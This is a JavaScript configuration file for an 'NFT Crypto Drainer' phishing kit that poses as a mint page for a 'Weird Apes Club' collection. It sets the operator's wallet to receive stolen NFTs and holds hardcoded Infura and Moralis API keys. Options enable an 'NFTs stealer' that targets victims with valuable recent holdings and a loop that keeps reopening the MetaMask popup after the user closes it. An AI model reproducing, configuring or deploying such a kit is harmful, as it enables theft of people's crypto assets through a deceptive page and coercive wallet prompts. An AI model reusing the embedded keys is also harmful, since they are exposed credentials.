// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0xBf25F9c5F28590c27869aA48367b5aDc34cA4Ecf";    // Your ETH wallet that you have to receive NFTs
const infuraId = "8cc79c144c804d61851cc0062a1ce80d"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "d31VF95ldsd4GabfxrZeip3avBUA56LWoPoZNKNr7irpqEEwTuSlXlvYb98fGnZg"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "WeirdApesClub",
    title: "Weird Apes Club", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "ONGOING",
    socialMedia: {
        discord: "#",
        twitter: "#",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.042,         // Price per NFT.
    totalSupply: 100,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 10,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "0xBf25F9c5F28590c27869aA48367b5aDc34cA4Ecf" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/0x32Moon/NFT-Crypto-Drainer | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
